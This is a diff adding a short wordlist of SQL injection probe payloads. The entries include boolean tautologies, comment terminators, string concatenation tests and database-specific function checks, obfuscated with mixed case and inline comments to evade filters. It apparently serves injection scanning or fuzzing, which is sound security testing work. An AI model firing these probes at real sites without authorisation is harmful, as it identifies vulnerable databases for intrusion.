@@ -1,0 +1,11 @@
+' '
+'||'
+'+'
+' AND '7645'='7645
+ -- -
+AnD 8891=8891 -- -
+anD/**/'jod'/**/'son'/**/=/**/'jodson'
+anD/**/datalength(('jod'))/**/=/**/3
+anD/**/tO_HeX((1))/**/='1'
+anD/**/Lengthb(('jod'))/**/=/**/'3'
+anD/**/Glob(('jod*',%20'jodson')/**/=/**/1
